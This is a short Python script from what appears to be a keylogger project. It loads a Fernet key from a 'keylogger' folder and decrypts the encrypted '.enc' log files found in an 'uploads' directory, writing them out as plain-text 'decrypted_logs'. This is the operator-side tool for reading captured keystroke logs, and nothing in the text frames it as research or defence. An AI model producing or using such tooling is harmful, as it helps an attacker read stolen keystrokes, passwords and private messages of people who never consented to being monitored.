import os
from cryptography.fernet import Fernet

KEY_PATH = "keylogger/key.key"
UPLOADS_DIR = "uploads"
DECRYPTED_DIR = "decrypted_logs"

def load_key():
    with open(KEY_PATH, "rb") as key_file:
        return key_file.read()

def decrypt_file(enc_path, dec_path, key):
    fernet = Fernet(key)
    with open(enc_path, "rb") as ef:
        encrypted_data = ef.read()
    if not encrypted_data:
        print(f"[!] Skipping {enc_path} (empty file)")
        return
    try:
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(dec_path, "wb") as df:
            df.write(decrypted_data)
        print(f"[+] Decrypted {enc_path} -> {dec_path}")
    except Exception as e:
        print(f"[!] Failed to decrypt {enc_path}: {e}")

if __name__ == "__main__":
    if not os.path.exists(DECRYPTED_DIR):
        os.makedirs(DECRYPTED_DIR)

    key = load_key()

    for filename in os.listdir(UPLOADS_DIR):
        if filename.endswith(".enc"):
            enc_path = os.path.join(UPLOADS_DIR, filename)
            dec_path = os.path.join(DECRYPTED_DIR, filename.replace(".enc", ".txt"))
            decrypt_file(enc_path, dec_path, key)
